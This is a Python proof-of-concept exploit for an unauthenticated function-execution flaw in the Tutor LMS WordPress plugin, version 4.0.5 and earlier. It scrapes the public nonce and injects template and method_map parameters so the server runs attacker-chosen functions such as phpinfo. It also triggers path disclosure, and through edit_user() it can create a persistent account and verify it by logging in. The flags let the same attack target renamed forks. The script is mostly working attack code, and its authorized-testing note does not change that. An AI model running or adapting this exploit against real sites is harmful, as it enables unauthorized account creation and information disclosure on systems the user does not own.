#!/usr/bin/env python3
"""
Tutor LMS <= 4.0.5 — unauthenticated arbitrary zero-argument PHP function execution
via template / method_map request-parameter injection.

Root cause
----------
`tutor_load_template($template, $variables)` (includes/tutor-template-functions.php:115)
runs `extract($variables)` BEFORE it resolves `$template`. Two unauthenticated callers pass
a request-derived `$variables` array whose keys the attacker controls:

  * Front-end course archive  templates/archive-course.php:16-33
        $get = Input::sanitize_array($_GET);              // keeps 'template' + 'data'
        tutor_load_template('archive-course-init', array_merge($get, [...fixed keys...]));
    Reached by GET /courses/?course_filter=1 . No nonce (archive-course.php calls
    load_listing($get, true) with $return_filter=true, which skips the nonce check).

  * admin-ajax handler         classes/Course_Filter.php:224  (action=tutor_course_filter_ajax)
        tutor_load_template('archive-course-init', array_merge(['loop_content_only'=>true], $sanitized_post));
    Reached by POST /wp-admin/admin-ajax.php . Nonce-gated, but Tutor prints the
    `_tutor_nonce` to every logged-out visitor, so the nonce is self-serve (not an auth barrier).

`extract()` overwrites the hard-coded `$template` with the attacker's value, so
`templates/single-content-loader.php` is included. That template does its own
`extract($data)` and then:

    ( isset($method_map[$context]) && is_callable($method_map[$context]) ) ? $method_map[$context]() : 0;

`extract($data)` lets the attacker overwrite `$method_map` and set `$context`, so the call becomes
<attacker-chosen-callable>() with ZERO arguments. `is_callable()` is the only gate.

Impact ceiling (honest)
-----------------------
The dispatch passes NO arguments, so this is arbitrary *zero-argument* function invocation, not
shell RCE:
  * Any zero-arg callable that PRINTS is an information-disclosure oracle: phpinfo, phpcredits,
    debug_print_backtrace, get_defined_vars, ...
  * Any zero-arg callable that reads a superglobal for its real inputs becomes a side-effect gadget.
    The important one is WordPress core `edit_user()` (wp-admin/includes/user.php): its signature is
    `edit_user($user_id = 0)`, so a zero-arg call takes the CREATE branch and reads
    user_login / pass1 / pass2 / email from $_POST — creating a PERSISTENT SUBSCRIBER account with
    NO nonce and NO capability check. An anonymous caller cannot set role (the role branch needs
    `promote_users`), so the account lands at the site default_role (subscriber).

SCOPE MATTERS. `edit_user` (and other wp-admin/includes functions) are only DEFINED when
`WP_ADMIN` is set — i.e. inside /wp-admin/admin-ajax.php, which require_once's
wp-admin/includes/admin.php -> user.php. On a plain front-end page request they are NOT loaded.
So the account-creation escalation is reachable ONLY through the admin-ajax route, and only where
that route actually honours the injection (some deployments neutralise it with a WAF / mu-plugin
while the front-end route stays open). This tool probes both and tells you which scope you have.

Reference: Wordfence "Tutor LMS <= 4.0.5 - Unauthenticated Remote Code Execution via template and
data POST Parameters". Affects Tutor LMS (themeum/tutor) <= 4.0.5; the vulnerable chain is
byte-identical in 4.0.4 and 4.0.5.

Usage
-----
  python3 tutor_methodmap_poc.py http://LAB:8099                 # safe read-only checks, both routes
  python3 tutor_methodmap_poc.py http://LAB:8099 --route ajax    # force the admin-ajax route
  python3 tutor_methodmap_poc.py http://LAB:8099 --callable debug_print_backtrace
  python3 tutor_methodmap_poc.py http://LAB:8099 --scope-probe   # is wp-admin/includes loaded per route?
  python3 tutor_methodmap_poc.py http://LAB:8099 --create-user --i-understand-this-creates-a-user

"Similar case" reuse — every request key is parameterised, so this drives any Tutor-style
extract()->method_map dispatch even if the plugin/fork renamed things:
  --ajax-action / --template-param / --sink-template / --data-param / --context-key
  --methodmap-key / --filter-param / --archive-path / --nonce-name

Authorized security testing only. Point it at a lab or an asset you own / are authorized to test.
"""
import argparse
import html
import re
import secrets
import sys
import urllib.parse

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

C = {"g": "\033[92m", "r": "\033[91m", "y": "\033[93m", "b": "\033[94m", "d": "\033[2m", "x": "\033[0m"}


def col(s, c):
    return f"{C[c]}{s}{C['x']}" if sys.stdout.isatty() else s


def banner(t):
    print(col(f"\n== {t} " + "=" * max(0, 64 - len(t)), "b"))


def ok(m):
    print(col("  [PASS] ", "g") + m)


def no(m):
    print(col("  [----] ", "d") + m)


def info(m):
    print(col("  [*] ", "y") + m)


def warn(m):
    print(col("  [!] ", "r") + m)


# read-only callables whose only effect is to PRINT (safe to invoke)
SAFE_CALLABLES = {"phpinfo", "phpcredits", "debug_print_backtrace", "phpversion",
                  "get_defined_vars", "get_loaded_extensions"}
EXEC_MARKERS = ["PHP Version", "Zend Engine", "PHP Credits", "Configuration File (php.ini)"]


class Target:
    def __init__(self, base, cfg, timeout=25, verify=True):
        self.base = base.rstrip("/")
        self.ajax = self.base + "/wp-admin/admin-ajax.php"
        self.archive = self.base + cfg.archive_path
        self.cfg = cfg
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "methodmap-poc"
        self.timeout = timeout
        self.verify = verify
        self.nonce = None

    # ---- payload builder -------------------------------------------------
    def _payload(self, callable_name=None, context="x", extra=None):
        """Build the template-injection field set (route-agnostic, bracket notation)."""
        c = self.cfg
        p = {c.template_param: c.sink_template, f"{c.data_param}[{c.context_key}]": context}
        if callable_name is not None:
            p[f"{c.data_param}[{c.methodmap_key}][{context}]"] = callable_name
        if extra:
            p.update(extra)
        return p

    def send(self, route, callable_name=None, context="x", extra=None, query=None):
        """Send the injection over the given route; return (resp, unescaped_body)."""
        c = self.cfg
        fields = self._payload(callable_name, context, extra) if callable_name is not None or extra else \
            {c.template_param: c.sink_template, f"{c.data_param}[{c.context_key}]": context}
        if route == "ajax":
            data = {"action": c.ajax_action, c.nonce_name: self.nonce or ""}
            data.update(fields)
            url = self.ajax + (("?" + urllib.parse.urlencode(query)) if query else "")
            r = self.s.post(url, data=data, timeout=self.timeout, verify=self.verify)
            body = ""
            try:
                d = r.json().get("data")
                body = d.get("html", "") if isinstance(d, dict) else (d or "")
            except ValueError:
                body = r.text
            return r, html.unescape(body or "")
        # frontend
        params = {c.filter_param: "1"}
        params.update(fields)
        if query:
            params.update(query)
        url = self.archive + "?" + urllib.parse.urlencode(params)
        r = self.s.get(url, timeout=self.timeout, verify=self.verify)
        return r, html.unescape(r.text or "")

    # ---- prerequisites ---------------------------------------------------
    def fingerprint(self):
        banner("fingerprint — plugin version via readme.txt")
        try:
            r = self.s.get(self.base + "/wp-content/plugins/tutor/readme.txt",
                           timeout=self.timeout, verify=self.verify)
            m = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
        except requests.RequestException as e:
            no(f"readme.txt fetch failed: {e}")
            return None
        if not m:
            no("no Stable tag (version unknown / plugin path blocked)")
            return None
        v = m.group(1)
        vt = tuple(int(x) for x in v.split("."))
        vuln = vt <= (4, 0, 5)
        (ok if vuln else info)(f"Tutor LMS {v} — " + ("<= 4.0.5: vulnerable" if vuln
                                                       else "newer than 4.0.5 — verify manually"))
        return v

    def scrape_nonce(self):
        rx = re.compile(rf'"{re.escape(self.cfg.nonce_name)}":"([a-f0-9]+)"')
        rx2 = re.compile(rf'{re.escape(self.cfg.nonce_name)}["\']?\s*[:=]\s*["\']([a-f0-9]{{8,}})')
        for path in ("/", self.cfg.archive_path, "/?post_type=courses"):
            try:
                r = self.s.get(self.base + path, timeout=self.timeout, verify=self.verify)
            except requests.RequestException:
                continue
            m = rx.search(r.text) or rx2.search(r.text)
            if m:
                self.nonce = m.group(1)
                return self.nonce
        return None

    # ---- route reachability ---------------------------------------------
    def route_works(self, route, context="probe"):
        """A route 'works' if the injected callable actually executes (vs the normal listing)."""
        _, ctrl = self.send(route, context=context)                       # no callable
        _, body = self.send(route, callable_name="phpinfo", context=context)
        ran = any(mk in body for mk in EXEC_MARKERS)
        ctrl_ran = any(mk in ctrl for mk in EXEC_MARKERS)
        return ran and not ctrl_ran

    def detect_routes(self):
        banner("route detection — which entry point honours the injection")
        working = []
        for route in ("frontend", "ajax"):
            if route == "ajax" and not self.nonce:
                no(f"{route:9s} skipped (no nonce scraped)")
                continue
            try:
                w = self.route_works(route)
            except requests.RequestException as e:
                no(f"{route:9s} error: {e}")
                continue
            (ok if w else no)(f"{route:9s} " + ("HONOURS the injection (dispatch fires)"
                                                if w else "does NOT honour the injection here"))
            if w:
                working.append(route)
        return working

    # ---- checks ----------------------------------------------------------
    def check_exec(self, route, callable_name):
        banner(f"exec [{route}] — arbitrary zero-arg callable ({callable_name})")
        _, ctrl = self.send(route, context="e")
        r, body = self.send(route, callable_name=callable_name, context="e")
        ran = (any(mk in body for mk in EXEC_MARKERS)
               or ("class-wp-hook.php(" in body and "tutor_load_template" in body)  # debug_print_backtrace
               or (callable_name == "debug_print_backtrace" and re.search(r"#\d+\s+/.+\.php\(\d+\)", body)))
        if ran and not any(mk in ctrl for mk in EXEC_MARKERS):
            ok(f"{callable_name}() executed server-side [{len(body)} bytes]")
            m = re.search(r"PHP Version\s*</td>\s*<td[^>]*>\s*([0-9.]+)", body) or \
                re.search(r"PHP Version\s+([0-9.]+)", body)
            if m:
                info(f"PHP {m.group(1)}")
            return True
        no(f"{callable_name} not observed (return values are discarded — only printing callables show)")
        return False

    def check_pathdisc(self, route):
        banner(f"pathdisc [{route}] — absolute path via bad template name")
        bad = "methodmap-nope-" + secrets.token_hex(3)
        c = self.cfg
        if route == "frontend":
            url = self.archive + "?" + urllib.parse.urlencode({c.filter_param: "1", c.template_param: bad})
            body = html.unescape(self.s.get(url, timeout=self.timeout, verify=self.verify).text)
        else:
            data = {"action": c.ajax_action, c.nonce_name: self.nonce or "", c.template_param: bad}
            try:
                d = self.s.post(self.ajax, data=data, timeout=self.timeout, verify=self.verify).json().get("data")
                body = html.unescape(d.get("html", "") if isinstance(d, dict) else (d or ""))
            except ValueError:
                body = ""
        m = re.search(r"(/[^\s\"'<>]+/(?:tutor|themes|plugins|wp-content)/[^\s\"'<>]+\.php)", body)
        if m:
            ok(f"absolute path disclosed: {col(m.group(1), 'r')}")
            return True
        no("no path surfaced (theme/WP_DEBUG_DISPLAY may suppress the notice)")
        return False

    def scope_probe(self, route):
        """Is wp-admin/includes loaded on this route? wp_dropdown_roles echoes role <option>s only if so.
        Note WP core emits single-quoted attrs: <option value='administrator'> — match both quote styles."""
        _, body = self.send(route, callable_name="wp_dropdown_roles", context="s")
        roles = sorted(set(re.findall(r"""option value=['"]([a-z_]+)['"]""", body)))
        admin_roles = [x for x in roles if x in ("administrator", "editor", "author",
                                                 "contributor", "subscriber")]
        loaded = bool(admin_roles)
        (ok if loaded else no)(
            f"scope [{route}] — wp-admin/includes " + ("LOADED" if loaded else "NOT loaded")
            + (f" (roles: {', '.join(admin_roles)}) => edit_user reachable here" if loaded
               else " => edit_user NOT reachable via this route"))
        return loaded

    def escalate_create_user(self, route):
        """DESTRUCTIVE: create a persistent subscriber via edit_user() over the admin-ajax route."""
        banner(f"escalation [{route}] — edit_user() -> unauth persistent subscriber account")
        if route != "ajax":
            warn("account creation needs the admin-ajax route (wp-admin/includes only loads there)")
            return False
        # scope_probe is an informative hint (it can false-negative); the login check below is the
        # real oracle, so we proceed and let account creation prove itself.
        if not self.scope_probe(route):
            warn("scope probe did not see wp-admin/includes — attempting anyway; login test is the oracle")
        user = "poc_" + secrets.token_hex(4)
        pw = secrets.token_urlsafe(16)
        email = f"{user}@example.com"
        c = self.cfg
        data = {
            "action": c.ajax_action, c.nonce_name: self.nonce or "",
            c.template_param: c.sink_template, f"{c.data_param}[{c.context_key}]": "e",
            f"{c.data_param}[{c.methodmap_key}][e]": "edit_user",
            # edit_user() reads these straight from $_POST in its create branch:
            "user_login": user, "email": email, "pass1": pw, "pass2": pw, "role": "subscriber",
        }
        self.s.post(self.ajax, data=data, timeout=self.timeout, verify=self.verify)
        info(f"attempted edit_user() create: user={user}  pass={pw}")
        # verify by logging in
        login = self.s.post(self.base + "/wp-login.php",
                            data={"log": user, "pwd": pw, "wp-submit": "Log In",
                                  "redirect_to": self.base + "/wp-admin/", "testcookie": "1"},
                            headers={"Cookie": "wordpress_test_cookie=WP+Cookie+check"},
                            allow_redirects=False, timeout=self.timeout, verify=self.verify)
        cookies = "; ".join(login.cookies.keys())
        if any(k.startswith("wordpress_logged_in") for k in login.cookies.keys()) or \
                (login.status_code in (302, 303) and "wp-admin" in login.headers.get("Location", "")):
            ok(f"ACCOUNT CREATED and login succeeded — unauth persistent subscriber '{user}'")
            warn(f"CLEANUP: delete user '{user}' in wp-admin > Users (unauth PoC cannot self-delete)")
            return True
        no(f"login did not confirm (status {login.status_code}, cookies: {cookies or 'none'}) — "
           f"account may still exist; check wp-admin > Users for '{user}'")
        return False


class Cfg:
    pass


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[1],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", help="base URL, e.g. http://127.0.0.1:8099")
    ap.add_argument("--route", choices=["auto", "frontend", "ajax"], default="auto")
    ap.add_argument("--callable", default="phpinfo", help="zero-arg callable to invoke (default phpinfo)")
    ap.add_argument("--scope-probe", action="store_true",
                    help="report whether wp-admin/includes (edit_user) is loaded per working route")
    ap.add_argument("--create-user", action="store_true",
                    help="ESCALATION: create a persistent subscriber via edit_user() (admin-ajax route)")
    ap.add_argument("--i-understand-this-creates-a-user", action="store_true",
                    help="required with --create-user (writes state; cannot self-clean)")
    # generic knobs for similar dispatches
    ap.add_argument("--archive-path", default="/courses/")
    ap.add_argument("--filter-param", default="course_filter")
    ap.add_argument("--ajax-action", default="tutor_course_filter_ajax")
    ap.add_argument("--template-param", default="template")
    ap.add_argument("--sink-template", default="single-content-loader")
    ap.add_argument("--data-param", default="data")
    ap.add_argument("--context-key", default="context")
    ap.add_argument("--methodmap-key", default="method_map")
    ap.add_argument("--nonce-name", default="_tutor_nonce")
    ap.add_argument("--timeout", type=int, default=25)
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()

    if args.insecure:
        import urllib3
        urllib3.disable_warnings()

    if args.create_user and not args.i_understand_this_creates_a_user:
        sys.exit(col("[abort] --create-user writes a persistent account and cannot self-clean; "
                     "re-run with --i-understand-this-creates-a-user", "r"))
    if args.callable not in SAFE_CALLABLES and not args.create_user:
        info(f"note: --callable {args.callable} is not a known read-only printing callable; "
             f"only printing callables are observable and the dispatch discards return values")

    cfg = Cfg()
    cfg.archive_path = args.archive_path
    cfg.filter_param = args.filter_param
    cfg.ajax_action = args.ajax_action
    cfg.template_param = args.template_param
    cfg.sink_template = args.sink_template
    cfg.data_param = args.data_param
    cfg.context_key = args.context_key
    cfg.methodmap_key = args.methodmap_key
    cfg.nonce_name = args.nonce_name

    t = Target(args.target, cfg, timeout=args.timeout, verify=not args.insecure)
    print(col("Tutor LMS <= 4.0.5 — unauthenticated method_map function-execution PoC", "b"))
    print(col(f"target: {t.base}", "d"))

    t.fingerprint()

    banner("nonce — scrape the anonymous _tutor_nonce (self-serve; not an auth barrier)")
    if t.scrape_nonce():
        ok(f"{cfg.nonce_name} = {t.nonce}")
    else:
        info("no nonce scraped (front-end route does not need it; admin-ajax route will be skipped)")

    routes = [args.route] if args.route != "auto" else t.detect_routes()
    if not routes:
        warn("no route honours the injection at this target (patched, or hardened on every path)")
        sys.exit(1)

    for route in routes:
        t.check_exec(route, args.callable)
        t.check_pathdisc(route)
        if args.scope_probe or args.create_user:
            t.scope_probe(route)

    if args.create_user:
        # prefer the admin-ajax route (only scope where edit_user is defined)
        route = "ajax" if "ajax" in routes else routes[0]
        t.escalate_create_user(route)

    banner("done")
    print(col("  read-only checks are non-destructive; --create-user writes a subscriber account.", "d"))


if __name__ == "__main__":
    main()
